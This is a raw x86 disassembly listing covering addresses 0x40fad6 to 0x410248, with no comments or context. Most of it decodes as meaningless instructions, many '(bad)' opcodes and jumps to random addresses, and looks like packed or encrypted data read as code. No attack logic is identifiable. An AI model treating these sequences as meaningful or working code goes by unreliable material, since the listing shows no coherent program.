  40fad6:	enter  0xec5f,0x7a
  40fada:	inc    ebx
  40fadb:	mov    bl,0x3b
  40fadd:	push   esi
  40fade:	push   ebp
  40fadf:	(bad)  
  40fae0:	(bad)  
  40fae2:	loopne 0x40fb41
  40fae4:	fs xchg ebx,eax
  40fae6:	jne    0x40fa91
  40fae8:	jo     0x40fb1f
  40faea:	mov    al,0x1c
  40faec:	clc    
  40faed:	dec    edi
  40faee:	popf   
  40faef:	je     0x40fa92
  40faf1:	fadd   QWORD PTR [ecx]
  40faf3:	out    dx,eax
  40faf4:	add    al,0xc6
  40faf6:	cmc    
  40faf7:	(bad)  
  40faf8:	mov    bh,0xae
  40fafa:	push   edx
  40fafb:	or     ch,BYTE PTR [ecx+0x1160f907]
  40fb01:	push   ebx
  40fb02:	ret    0x8f47
  40fb05:	stc    
  40fb06:	pushf  
  40fb07:	xchg   BYTE PTR [ecx+0x5],ch
  40fb0a:	add    DWORD PTR [esi+0x2c0aa303],esi
  40fb10:	fcmovnb st,st(5)
  40fb12:	push   edx
  40fb13:	stc    
  40fb14:	push   esp
  40fb15:	push   edx
  40fb16:	out    dx,al
  40fb17:	jns    0x40faf1
  40fb19:	xlat   BYTE PTR ds:[ebx]
  40fb1a:	ins    DWORD PTR es:[edi],dx
  40fb1b:	mov    ds:0xa29df64a,eax
  40fb20:	mov    bh,0xf0
  40fb22:	imul   esp,esi,0xeda99100
  40fb28:	and    BYTE PTR [esi+esi*1+0x6d],bl
  40fb2c:	xchg   ecx,eax
  40fb2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb2e:	add    ebx,DWORD PTR [esi+ecx*2+0x7]
  40fb32:	cdq    
  40fb33:	jge    0x40fb48
  40fb35:	fwait
  40fb36:	fwait
  40fb37:	push   cs
  40fb38:	fmul   st(4),st
  40fb3a:	sub    ebx,0xffffff90
  40fb3d:	add    ecx,DWORD PTR [edi]
  40fb3f:	call   0x5c165e7e
  40fb44:	lock (bad) 
  40fb46:	xchg   ecx,eax
  40fb47:	mov    dl,0x39
  40fb49:	sti    
  40fb4a:	mov    bh,0xb2
  40fb4c:	mov    ah,cl
  40fb4e:	dec    esp
  40fb4f:	int3   
  40fb50:	dec    ebp
  40fb51:	scas   eax,DWORD PTR es:[edi]
  40fb52:	and    al,bl
  40fb54:	cmp    ecx,eax
  40fb56:	xchg   esp,eax
  40fb57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb58:	lods   al,BYTE PTR ds:[esi]
  40fb59:	sbb    DWORD PTR [ebx+0x7ecdf465],eax
  40fb5f:	stos   DWORD PTR es:[edi],eax
  40fb60:	shr    BYTE PTR [edx+0x5a8459f8],cl
  40fb66:	jbe    0x40fbe7
  40fb68:	push   0x234d7b5a
  40fb6d:	hlt    
  40fb6e:	mov    bl,0xd8
  40fb70:	pushf  
  40fb71:	fs inc ecx
  40fb73:	sub    dh,ah
  40fb75:	mov    esi,0xcca33864
  40fb7a:	add    al,0xb0
  40fb7c:	mov    DWORD PTR [eax+0x7a44508e],ebp
  40fb82:	jle    0x40fbe1
  40fb84:	cmp    ecx,DWORD PTR [ebx+ebx*2+0xa]
  40fb88:	xchg   esp,eax
  40fb89:	add    al,0x22
  40fb8b:	dec    ebx
  40fb8c:	nop
  40fb8d:	shl    dl,cl
  40fb8f:	sbb    al,0x72
  40fb91:	sbb    dl,cl
  40fb93:	icebp  
  40fb94:	push   0xffffff91
  40fb96:	mov    dh,0xf
  40fb98:	cmp    BYTE PTR [edx+0x1dd92b49],ah
  40fb9e:	clc    
  40fb9f:	ss pop es
  40fba1:	cmc    
  40fba2:	inc    esp
  40fba3:	into   
  40fba4:	pop    ebx
  40fba5:	sub    al,0x54
  40fba7:	xchg   ebx,eax
  40fba8:	pop    ss
  40fba9:	scas   eax,DWORD PTR es:[edi]
  40fbaa:	popf   
  40fbab:	lea    edx,[ebx+0xc]
  40fbae:	pop    eax
  40fbaf:	fstp   QWORD PTR [edi-0x59c34dfb]
  40fbb5:	push   eax
  40fbb6:	pop    ds
  40fbb7:	lds    ebx,FWORD PTR [eax]
  40fbb9:	xor    edx,eax
  40fbbb:	das    
  40fbbc:	mul    BYTE PTR [ecx+0x8]
  40fbbf:	rol    DWORD PTR [ebx+esi*4+0x3ce3ec96],cl
  40fbc6:	push   ss
  40fbc7:	jmp    0x3aa4c540
  40fbcc:	cmp    eax,0x8fa58b00
  40fbd1:	in     al,dx
  40fbd2:	pop    eax
  40fbd3:	adc    esi,DWORD PTR [esi+0x53344001]
  40fbd9:	ss gs jnp 0x40fb85
  40fbdd:	mov    esp,0x156bb42c
  40fbe2:	mov    ecx,0x7977e665
  40fbe7:	xchg   edi,eax
  40fbe8:	popf   
  40fbe9:	pop    edi
  40fbea:	mov    edi,0xd31a41b1
  40fbef:	dec    esi
  40fbf0:	shl    DWORD PTR [edi+0x27cdada5],cl
  40fbf6:	add    cl,BYTE PTR [esp+esi*8+0x477d04a8]
  40fbfd:	push   edi
  40fbfe:	mov    db1,esi
  40fc01:	dec    BYTE PTR [esi]
  40fc03:	adc    dh,BYTE PTR [eax]
  40fc05:	jno    0x40fc23
  40fc07:	dec    edx
  40fc08:	fsubrp st(4),st
  40fc0a:	inc    ebx
  40fc0b:	push   es
  40fc0c:	cld    
  40fc0d:	cdq    
  40fc0e:	scas   al,BYTE PTR es:[edi]
  40fc0f:	fcom   QWORD PTR [ecx+0x45]
  40fc13:	cmp    DWORD PTR [ebp+0x6b],edi
  40fc16:	mov    ah,0x20
  40fc18:	mov    ds:0x6f905b46,eax
  40fc1d:	push   esi
  40fc1e:	push   ebp
  40fc1f:	cmc    
  40fc20:	xchg   DWORD PTR [ebp-0x2d],edx
  40fc23:	pusha  
  40fc24:	sbb    eax,DWORD PTR ds:0x8fdf0cd7
  40fc2a:	(bad)  
  40fc2b:	sub    al,0xca
  40fc2d:	adc    dl,cl
  40fc2f:	pushf  
  40fc30:	cmp    cl,dl
  40fc32:	and    al,0xd0
  40fc34:	cmp    eax,0x5ec16efa
  40fc39:	test   eax,0xe323d4b0
  40fc3e:	pop    eax
  40fc3f:	jno    0x40fc8c
  40fc41:	mov    bl,0xa0
  40fc43:	dec    ecx
  40fc44:	xchg   esi,eax
  40fc45:	shl    DWORD PTR [ecx],1
  40fc47:	jb     0x40fc11
  40fc49:	push   ss
  40fc4a:	test   al,0xb7
  40fc4c:	and    al,0xb3
  40fc4e:	xchg   esp,eax
  40fc4f:	test   DWORD PTR [eax-0xd],edx
  40fc52:	xor    al,0x45
  40fc54:	fcomip st,st(3)
  40fc56:	ret    
  40fc57:	cs icebp 
  40fc59:	sbb    edx,0x31
  40fc5c:	xor    bh,ah
  40fc5e:	sub    DWORD PTR [esi+0x21],0xdd6a799a
  40fc65:	push   edx
  40fc66:	xlat   BYTE PTR ds:[ebx]
  40fc67:	mov    ebx,0xb2e7b4f5
  40fc6c:	cmp    DWORD PTR [esi+edi*4-0x6d36606a],esi
  40fc73:	and    DWORD PTR [edx-0x5b],0xb0f61566
  40fc7a:	add    BYTE PTR [esp+esi*4-0x3c6940],al
  40fc81:	int    0x6b
  40fc83:	fcomp  QWORD PTR [esi+0x19]
  40fc86:	test   eax,0x284f7868
  40fc8b:	dec    esi
  40fc8c:	lods   al,BYTE PTR ds:[esi]
  40fc8d:	iret   
  40fc8e:	gs cs push cs
  40fc91:	adc    BYTE PTR [ebp-0x72],dh
  40fc94:	(bad)  
  40fc95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc96:	cmp    ah,BYTE PTR [eax]
  40fc98:	mov    ss,WORD PTR [esi+esi*8-0x56]
  40fc9c:	not    BYTE PTR [ecx+0x3c]
  40fc9f:	dec    ebp
  40fca0:	add    ebx,esi
  40fca2:	mov    ds:0x302a1790,eax
  40fca7:	fld    TBYTE PTR [eax+0x3f]
  40fcaa:	mov    al,0xe8
  40fcac:	bound  edx,QWORD PTR [edx+0x7f]
  40fcaf:	aas    
  40fcb0:	ins    BYTE PTR es:[edi],dx
  40fcb1:	xchg   edi,eax
  40fcb2:	xchg   esi,eax
  40fcb3:	cwde   
  40fcb4:	pop    ebx
  40fcb5:	adc    bl,BYTE PTR [ecx-0x1fee75cb]
  40fcbb:	arpl   WORD PTR [ebp-0x290bc31d],bp
  40fcc1:	mov    edi,0x5b74988a
  40fcc6:	loopne 0x40fd18
  40fcc8:	cmp    al,0x66
  40fcca:	jmp    0x40fcc5
  40fccc:	std    
  40fccd:	icebp  
  40fcce:	add    esi,ecx
  40fcd0:	add    eax,ecx
  40fcd2:	jmp    0x40ffa1
  40fcd7:	lock sub DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	ror    DWORD PTR [esi],0x7
  40fce5:	in     eax,0xb6
  40fce7:	mov    ecx,0xac7e7eb3
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fccc
  40fcf0:	mov    esi,0xbcdfa93c
  40fcf5:	fsub   DWORD PTR [ebp-0x50260339]
  40fcfb:	nop
  40fcfc:	(bad)  
  40fcfd:	adc    bh,BYTE PTR [esi]
  40fcff:	jl     0x40fce0
  40fd01:	lods   eax,DWORD PTR ds:[esi]
  40fd02:	out    0x45,al
  40fd04:	sub    cl,BYTE PTR [eax]
  40fd06:	push   eax
  40fd07:	dec    esi
  40fd08:	mov    ebx,0x841005b5
  40fd0d:	pop    eax
  40fd0e:	iret   
  40fd0f:	ja     0x40fd5d
  40fd11:	leave  
  40fd12:	imul   edx,DWORD PTR [ebp+eax*4+0x12155ba3],0x4714832d
  40fd1d:	xor    al,0xac
  40fd1f:	inc    ebx
  40fd20:	adc    eax,0x44eabf45
  40fd25:	mov    ?,WORD PTR [ebp+0x1f]
  40fd28:	out    dx,al
  40fd29:	or     al,0x61
  40fd2b:	enter  0xf3c6,0x43
  40fd2f:	add    dl,dh
  40fd31:	jmp    0x40fd55
  40fd33:	sub    BYTE PTR [esi],dh
  40fd35:	dec    edi
  40fd36:	jecxz  0x40fd84
  40fd38:	push   cs
  40fd39:	mov    esi,0xc4477cd1
  40fd3e:	mov    WORD PTR [ebx+eiz*4],cs
  40fd41:	sub    al,0x2d
  40fd43:	sbb    eax,0x13d29d96
  40fd48:	dec    ebx
  40fd49:	mov    cl,0x88
  40fd4b:	sbb    al,0x25
  40fd4d:	sbb    cl,BYTE PTR [edx]
  40fd4f:	sti    
  40fd50:	inc    ebp
  40fd51:	fwait
  40fd52:	into   
  40fd53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd54:	retf   
  40fd55:	mov    es,WORD PTR [edx+ebx*4+0x29]
  40fd59:	retf   0x5105
  40fd5c:	push   ebx
  40fd5d:	shl    BYTE PTR [esi+0x3d],0x87
  40fd61:	in     al,dx
  40fd62:	pop    eax
  40fd63:	mov    dl,dl
  40fd65:	div    BYTE PTR [ebx+0x19]
  40fd68:	pop    edi
  40fd69:	cmp    al,0xa2
  40fd6b:	into   
  40fd6c:	nop
  40fd6d:	push   cs
  40fd6e:	mov    WORD PTR [edx-0x6e],gs
  40fd71:	stos   DWORD PTR es:[edi],eax
  40fd72:	in     al,0xdd
  40fd74:	and    dl,BYTE PTR [edi+0x44]
  40fd77:	mov    bh,cl
  40fd79:	bound  esi,QWORD PTR [ebx-0x4447dd06]
  40fd7f:	das    
  40fd80:	add    DWORD PTR [edi+0x17],0xffffff88
  40fd84:	sub    eax,0xadf95b78
  40fd89:	xchg   ecx,eax
  40fd8a:	inc    edx
  40fd8b:	adc    BYTE PTR [edi-0x20f72198],dl
  40fd91:	cli    
  40fd92:	lahf   
  40fd93:	in     al,dx
  40fd94:	rol    BYTE PTR [edi-0x5e],cl
  40fd97:	mov    ecx,0x2e798614
  40fd9c:	mov    ecx,0x6ae5c6fa
  40fda1:	(bad)  
  40fda2:	push   ds
  40fda3:	out    dx,eax
  40fda4:	jo     0x40fd7b
  40fda6:	cmp    ch,0x5c
  40fda9:	pop    es
  40fdaa:	aas    
  40fdab:	jnp    0x40fd82
  40fdad:	pop    ss
  40fdae:	sbb    DWORD PTR [eax],ebx
  40fdb0:	adc    al,0x3c
  40fdb2:	xlat   BYTE PTR ds:[ebx]
  40fdb3:	inc    eax
  40fdb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdb5:	add    eax,0x477d8571
  40fdba:	arpl   si,sp
  40fdbc:	mov    al,ds:0xfc2ad7d1
  40fdc1:	mov    ebx,0x243b15e6
  40fdc6:	jnp    0x40fe27
  40fdc8:	rol    BYTE PTR [ebx+eiz*2+0x6e07443a],1
  40fdcf:	push   eax
  40fdd0:	sahf   
  40fdd1:	mov    edx,esi
  40fdd3:	or     bh,bl
  40fdd5:	cmp    ebx,DWORD PTR [ecx+ebp*2]
  40fdd8:	mov    bl,0x92
  40fdda:	scas   eax,DWORD PTR es:[edi]
  40fddb:	into   
  40fddc:	hlt    
  40fddd:	ins    DWORD PTR es:[edi],dx
  40fdde:	(bad)  
  40fddf:	in     eax,dx
  40fde0:	imul   ebp,DWORD PTR [ebp-0x6f657f86],0x61
  40fde7:	sti    
  40fde8:	vpsubsb xmm4,xmm0,XMMWORD PTR [ebx+ebp*4]
  40fdee:	ret    
  40fdef:	out    0xea,al
  40fdf1:	bound  ecx,QWORD PTR [edx]
  40fdf3:	or     cl,BYTE PTR [esi-0x216c7e93]
  40fdf9:	test   BYTE PTR ds:0x1c31402,bl
  40fdff:	pop    edi
  40fe00:	sub    DWORD PTR [edx],ecx
  40fe02:	xchg   ebp,eax
  40fe03:	ds pop ecx
  40fe05:	(bad)  
  40fe06:	(bad)  
  40fe08:	fisub  DWORD PTR [ecx-0x37]
  40fe0b:	xlat   BYTE PTR ds:[ebx]
  40fe0c:	(bad)  
  40fe0e:	nop
  40fe0f:	scas   al,BYTE PTR es:[edi]
  40fe10:	dec    edx
  40fe11:	mov    edi,0x11a685d3
  40fe16:	mov    esp,0xb2334005
  40fe1b:	mov    edi,0x541db589
  40fe20:	test   al,0xf8
  40fe22:	push   edx
  40fe23:	cmp    ebx,ecx
  40fe25:	and    bl,BYTE PTR ds:0xb6b129e6
  40fe2b:	push   esp
  40fe2c:	mov    WORD PTR [ecx+0x63],es
  40fe2f:	and    edi,eax
  40fe31:	inc    ecx
  40fe32:	inc    edi
  40fe33:	and    eax,0xbfbfe6f4
  40fe38:	mov    dl,0x92
  40fe3a:	fdiv   DWORD PTR [ebp+esi*8-0x41dcd1e4]
  40fe41:	push   es
  40fe42:	repnz push ss
  40fe44:	mul    DWORD PTR [ebp+0xc177acb]
  40fe4a:	sub    esp,esi
  40fe4c:	int3   
  40fe4d:	scas   al,BYTE PTR es:[edi]
  40fe4e:	or     DWORD PTR [edx-0x60f198d1],ebx
  40fe54:	ja     0x40fe9c
  40fe56:	shl    DWORD PTR fs:[esi-0x7a],0xd7
  40fe5b:	pushf  
  40fe5c:	inc    ecx
  40fe5d:	mov    eax,0x59f936fd
  40fe62:	push   esi
  40fe63:	jmp    0x539b879b
  40fe68:	add    DWORD PTR [esi-0x18],ecx
  40fe6b:	push   ebx
  40fe6c:	mov    ebp,0x287b42d
  40fe71:	sub    al,0x83
  40fe73:	mov    DWORD PTR [edx-0x65],ebp
  40fe76:	ret    
  40fe77:	inc    edx
  40fe78:	lds    ebp,FWORD PTR [ebx+0x41]
  40fe7b:	mov    esi,0x724998c6
  40fe80:	lds    esp,FWORD PTR [ebx]
  40fe82:	das    
  40fe83:	adc    bh,ch
  40fe85:	sbb    esp,DWORD PTR [edi+0x51]
  40fe88:	mov    bh,0x45
  40fe8a:	neg    DWORD PTR [ecx-0x12]
  40fe8d:	les    ecx,FWORD PTR [ecx]
  40fe8f:	shl    al,cl
  40fe91:	test   DWORD PTR [edi+ebp*4-0x529a6785],edi
  40fe98:	sub    al,0x2c
  40fe9a:	and    al,0xd0
  40fe9c:	in     eax,dx
  40fe9d:	sti    
  40fe9e:	out    0x8c,al
  40fea0:	mov    dh,0x7f
  40fea2:	ins    DWORD PTR es:[edi],dx
  40fea3:	(bad)  
  40fea4:	int3   
  40fea5:	mov    ch,0xfa
  40fea7:	data16 jg 0x40fe53
  40feaa:	dec    edi
  40feab:	pushf  
  40feac:	or     BYTE PTR [ebx+0x5a],0x39
  40feb0:	push   ecx
  40feb1:	das    
  40feb2:	popf   
  40feb3:	adc    ebp,edi
  40feb5:	and    al,0x90
  40feb7:	mov    edx,0xfce7792f
  40febc:	inc    esi
  40febd:	xchg   edx,eax
  40febe:	je     0x40ff3d
  40fec0:	push   eax
  40fec1:	loopne 0x40fe77
  40fec3:	pop    esi
  40fec4:	enter  0xd706,0x2d
  40fec8:	jno    0x40fea8
  40feca:	test   DWORD PTR [ebx+0x589336e1],ecx
  40fed0:	sahf   
  40fed1:	cvttps2pi mm3,QWORD PTR [edi-0x7154a6f9]
  40fed8:	adc    eax,0xdc28b151
  40fedd:	das    
  40fede:	add    al,0x4e
  40fee0:	popf   
  40fee1:	cmp    eax,0x5856aa4c
  40fee6:	imul   eax,DWORD PTR [ecx],0xbc3e34c6
  40feec:	sti    
  40feed:	sub    dh,ch
  40feef:	pop    es
  40fef0:	es mov ebx,0xce02796b
  40fef6:	sub    eax,0x3ae0f456
  40fefb:	fxch   st(6)
  40fefd:	jmp    0x40ff77
  40feff:	js     0x40fe84
  40ff01:	std    
  40ff02:	test   ebp,esi
  40ff04:	in     al,0x8
  40ff06:	aaa    
  40ff07:	mov    cl,0xf4
  40ff09:	cmp    DWORD PTR [eax+0x67df85c0],0x19
  40ff10:	iret   
  40ff11:	js     0x40ff19
  40ff13:	(bad)  
  40ff14:	mov    al,0x64
  40ff16:	mov    edx,0xb9af5569
  40ff1b:	push   0x383d9031
  40ff20:	lea    eax,[eax+0x3c]
  40ff23:	test   BYTE PTR [ecx+ebx*2],bl
  40ff26:	rcr    BYTE PTR [esi-0x32],cl
  40ff29:	dec    ecx
  40ff2a:	jno    0x40febb
  40ff2c:	addr16 sub eax,esi
  40ff2f:	or     eax,0x7d86c6af
  40ff34:	pop    es
  40ff35:	jmp    0xeafb:0x99122cc4
  40ff3c:	or     ecx,DWORD PTR [edi+0x52]
  40ff3f:	imul   eax,DWORD PTR [esp+esi*8+0x315ce8ec],0xef7e6ad9
  40ff4a:	popf   
  40ff4b:	add    esp,eax
  40ff4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff4e:	push   cs
  40ff4f:	push   es
  40ff50:	rol    BYTE PTR [esi],1
  40ff52:	in     eax,0x8c
  40ff54:	jmp    0xe94f:0x595b6f51
  40ff5b:	retf   
  40ff5c:	mov    ah,0xe4
  40ff5e:	add    al,0x60
  40ff60:	jge    0x40ff18
  40ff62:	out    0x30,al
  40ff64:	and    bl,BYTE PTR [ebx]
  40ff66:	and    eax,0xc969892d
  40ff6b:	mov    ah,0xe4
  40ff6d:	xchg   ecx,eax
  40ff6e:	es push ss
  40ff70:	mov    ebx,0xb3dada2d
  40ff75:	inc    ebp
  40ff76:	jmp    0x63de042a
  40ff7b:	stc    
  40ff7c:	add    dh,dh
  40ff7e:	pop    esi
  40ff7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff80:	pop    ebx
  40ff81:	ret    0x5da
  40ff84:	leave  
  40ff85:	inc    esp
  40ff86:	jmp    FWORD PTR [edx+0x2b12ac39]
  40ff8c:	in     eax,0x94
  40ff8e:	xchg   ebx,eax
  40ff8f:	(bad)  
  40ff90:	in     eax,dx
  40ff91:	std    
  40ff92:	pop    esp
  40ff93:	enter  0x85ff,0x96
  40ff97:	ficom  WORD PTR [esi]
  40ff99:	fadd   DWORD PTR [ebx+esi*4+0x1fc8ae31]
  40ffa0:	cmp    DWORD PTR [edi],ecx
  40ffa2:	scas   eax,DWORD PTR es:[edi]
  40ffa3:	(bad)  
  40ffa4:	mov    esi,DWORD PTR [ebp+0xc]
  40ffa7:	mov    DWORD PTR ds:0x433723,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4337e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0x80c839b1
  40ffd9:	pusha  
  40ffda:	dec    esp
  40ffdb:	idiv   DWORD PTR [esi+0x7cac7e7e]
  40ffe1:	jle    0x410061
  40ffe3:	leave  
  40ffe4:	pop    edx
  40ffe5:	and    DWORD PTR [esi],ebx
  40ffe7:	push   edx
  40ffe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffe9:	dec    edi
  40ffea:	fincstp 
  40ffec:	adc    ah,BYTE PTR [edi-0x5b]
  40ffef:	mov    eax,DWORD PTR [ebp-0x581e0f26]
  40fff5:	enter  0x54f7,0xcf
  40fff9:	shl    dl,1
  40fffb:	hlt    
  40fffc:	data16 in al,0x30
  40ffff:	jmp    0x78237f9a
  410004:	xchg   esp,eax
  410005:	aam    0xcd
  410007:	jns    0x40ffbe
  410009:	pop    es
  41000a:	dec    edx
  41000b:	int    0x7c
  41000d:	iret   
  41000e:	rol    BYTE PTR [edi-0x695aa8bb],cl
  410014:	sub    eax,0x7092fa45
  410019:	bound  esp,QWORD PTR [eax]
  41001b:	fimul  DWORD PTR [esi+0xc]
  41001e:	inc    eax
  41001f:	rol    DWORD PTR [esi-0x1c53a38d],1
  410025:	clc    
  410026:	push   esi
  410027:	mov    ds:0xfc1ab8ae,al
  41002c:	jno    0x40ffd7
  41002e:	fidiv  WORD PTR [esi-0x7c]
  410031:	xor    BYTE PTR [ecx-0x32],dl
  410034:	adc    eax,0xb86cd868
  410039:	add    DWORD PTR [edi-0x41],edx
  41003c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41003d:	popa   
  41003e:	fbld   TBYTE PTR ds:0xd0de8b65
  410044:	or     eax,0x827c5f23
  410049:	shl    DWORD PTR [edi+0x72],1
  41004c:	xchg   eax,edi
  41004e:	mov    ds:0xd3a1e629,al
  410053:	sbb    DWORD PTR [eax],ebx
  410055:	sub    DWORD PTR [ebx+0x63c48d5c],0x54
  41005c:	arpl   sp,cx
  41005e:	lea    edx,[edx+0x1b]
  410061:	retf   
  410062:	jge    0x4100b2
  410064:	es sti 
  410066:	add    eax,0x6be7ea6
  41006b:	mov    ah,BYTE PTR [edi+ebx*8-0x7122c4f0]
  410072:	xchg   esp,eax
  410073:	mov    bh,0x4f
  410075:	in     al,dx
  410076:	call   0xef87e455
  41007b:	push   ds
  41007c:	push   ss
  41007d:	pop    ds
  41007e:	out    dx,al
  41007f:	int3   
  410080:	ins    BYTE PTR es:[edi],dx
  410081:	test   al,0x84
  410083:	ins    BYTE PTR es:[edi],dx
  410084:	sub    esp,DWORD PTR [eax-0x7ac1b673]
  41008a:	clc    
  41008b:	and    bl,BYTE PTR [ecx]
  41008d:	and    edx,DWORD PTR [ebx-0x5fd6de36]
  410093:	mov    ecx,0xacab44b3
  410098:	mov    dh,0x56
  41009a:	fdivr  QWORD PTR [edi-0x5b]
  41009d:	jle    0x4100d2
  41009f:	aad    0x34
  4100a1:	(bad)  
  4100a2:	lds    eax,FWORD PTR [ecx+0x56f230c0]
  4100a8:	xchg   ecx,eax
  4100a9:	test   eax,0x72ca12e3
  4100ae:	inc    eax
  4100af:	push   edi
  4100b0:	(bad)  
  4100b1:	jp     0x4100b6
  4100b3:	dec    ecx
  4100b4:	mov    esp,ds
  4100b6:	add    cl,BYTE PTR [ebx]
  4100b8:	les    eax,FWORD PTR [eax+0x63]
  4100bb:	push   eax
  4100bc:	adc    BYTE PTR [edi],ah
  4100be:	dec    edi
  4100bf:	das    
  4100c0:	lods   eax,DWORD PTR ds:[esi]
  4100c1:	dec    eax
  4100c2:	mov    al,0x2e
  4100c4:	and    al,0x95
  4100c6:	add    edx,esi
  4100c8:	dec    esp
  4100c9:	push   DWORD PTR [ecx+0x51]
  4100cc:	sbb    edx,ebp
  4100ce:	pop    ebp
  4100cf:	stos   DWORD PTR es:[edi],eax
  4100d0:	mov    edx,0xd4740b3d
  4100d5:	jbe    0x41006a
  4100d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100d8:	push   ecx
  4100d9:	and    eax,0x2efb11f8
  4100de:	or     dl,BYTE PTR [ebx]
  4100e0:	bound  ebp,QWORD PTR [ebx]
  4100e2:	ss jo  0x41012d
  4100e5:	lahf   
  4100e6:	or     DWORD PTR [edi+0x52],esi
  4100e9:	sub    bl,BYTE PTR [esi]
  4100eb:	std    
  4100ec:	(bad)  
  4100ed:	cmp    DWORD PTR [eax],esp
  4100ef:	jecxz  0x4100b1
  4100f1:	jmp    0x41008e
  4100f3:	call   0x6b91:0xa110b0ca
  4100fa:	xchg   esi,eax
  4100fb:	adc    ebx,DWORD PTR [ebx]
  4100fd:	enter  0x8b63,0x88
  410101:	fisttp WORD PTR [eax+0x20b2f68c]
  410107:	mov    ah,0xbe
  410109:	mov    esp,0x9c349065
  41010e:	(bad)  
  41010f:	cmp    esp,edx
  410111:	pmaddwd mm3,QWORD PTR [ebp-0x72ef2371]
  410118:	outs   dx,DWORD PTR ds:[esi]
  410119:	mov    dl,0xeb
  41011b:	mov    eax,0x6c00c7b0
  410120:	loope  0x41010f
  410122:	push   0x79563c3a
  410127:	sbb    al,0x6d
  410129:	jne    0x41019b
  41012b:	ret    
  41012c:	fidiv  WORD PTR [edi+0x2d]
  41012f:	jmp    0x5f71babd
  410134:	je     0x4101a3
  410136:	popa   
  410137:	imul   eax,DWORD PTR [ebx+0x72cbbd4],0x904bdf43
  410141:	outs   dx,DWORD PTR ds:[esi]
  410142:	ins    BYTE PTR es:[edi],dx
  410143:	jae    0x4100f8
  410145:	shl    BYTE PTR [ebx-0x43],cl
  410148:	xchg   DWORD PTR [esi],esi
  41014a:	loopne 0x410149
  41014c:	jmp    0xc9a405fb
  410151:	mov    BYTE PTR [edx],ch
  410153:	mov    bl,dl
  410155:	mov    bh,0x8
  410157:	xor    edx,DWORD PTR [ebx]
  410159:	repz mov dl,0xe9
  41015c:	mov    al,0x9
  41015e:	sub    DWORD PTR [ecx-0x68],ebp
  410161:	cwde   
  410162:	rol    BYTE PTR [edx+0x36dc2e9],1
  410168:	adc    al,0xf3
  41016a:	and    DWORD PTR ds:0x15cb75e,esp
  410170:	jp     0x41012d
  410172:	mov    ecx,0xdfe15a21
  410177:	sbb    DWORD PTR [esi+esi*4-0x58f713b8],ebp
  41017e:	xlat   BYTE PTR ds:[ebx]
  41017f:	jne    0x4101b9
  410181:	int    0x70
  410183:	and    ebp,DWORD PTR [edi+0x30]
  410186:	rcr    BYTE PTR [edx+0x5effa7bb],cl
  41018c:	sub    DWORD PTR [edx+0xfcc7915],esi
  410192:	sahf   
  410193:	test   DWORD PTR [eax],esp
  410195:	repnz xor al,0xf5
  410198:	dec    edi
  410199:	pushf  
  41019a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41019b:	mov    ds:0x36a6f604,eax
  4101a0:	mov    ah,0x67
  4101a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101a3:	mov    esi,0x554462cd
  4101a8:	cmp    al,0x6f
  4101aa:	mov    bh,ch
  4101ac:	push   edx
  4101ad:	mov    bh,0x89
  4101af:	or     edi,DWORD PTR [esi*1-0x75f44598]
  4101b6:	fisubr WORD PTR [ecx+0x37102466]
  4101bc:	push   0x12
  4101be:	mov    BYTE PTR [esi-0x7f65b2a],bh
  4101c4:	ins    BYTE PTR es:[edi],dx
  4101c5:	loopne 0x4101b1
  4101c7:	popf   
  4101c8:	(bad)  
  4101c9:	mov    bh,0x66
  4101cb:	test   DWORD PTR ds:0x6caf11a7,0x35ca144
  4101d5:	cmp    edx,DWORD PTR [eax]
  4101d7:	sub    eax,0x4284ef27
  4101dc:	sti    
  4101dd:	in     al,0xd4
  4101df:	fsubr  DWORD PTR [ebp-0x10]
  4101e2:	(bad)  
  4101e3:	loop   0x4101e7
  4101e5:	dec    edx
  4101e6:	sub    al,0xc
  4101e8:	pop    esp
  4101e9:	mov    ebp,0x5642eeae
  4101ee:	and    WORD PTR [ecx+edi*2],bp
  4101f2:	arpl   WORD PTR [ebp+0x33432e38],bx
  4101f8:	stc    
  4101f9:	jg     0x410224
  4101fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101fc:	add    eax,0x6824742a
  410201:	stos   DWORD PTR es:[edi],eax
  410202:	popf   
  410203:	test   DWORD PTR [edi-0x765f7e8b],ecx
  410209:	xchg   DWORD PTR [ebp+0x459c691c],ebp
  41020f:	xchg   ebx,eax
  410210:	mov    ecx,0xced507be
  410215:	lahf   
  410216:	xchg   ecx,eax
  410217:	cmp    edx,DWORD PTR [edi-0x36]
  41021a:	out    dx,eax
  41021b:	mov    al,BYTE PTR [esi-0x33a91853]
  410221:	jp     0x4101e3
  410223:	mov    fs,ebx
  410225:	cs cld 
  410227:	pusha  
  410228:	push   ss
  410229:	add    dh,cl
  41022b:	out    dx,al
  41022c:	sub    DWORD PTR [ebx],edi
  41022e:	mov    dl,0xc9
  410230:	xor    BYTE PTR ds:0x8fcef379,dl
  410236:	inc    esi
  410237:	jl     0x410299
  410239:	shr    DWORD PTR [eax+0x24],0x32
  41023d:	imul   edi,DWORD PTR [edi],0xffffffde
  410240:	repnz cli 
  410242:	push   edx
  410243:	cli    
  410244:	bound  ebp,QWORD PTR [esp+ebx*8-0x20]
  410248:	pop    ecx
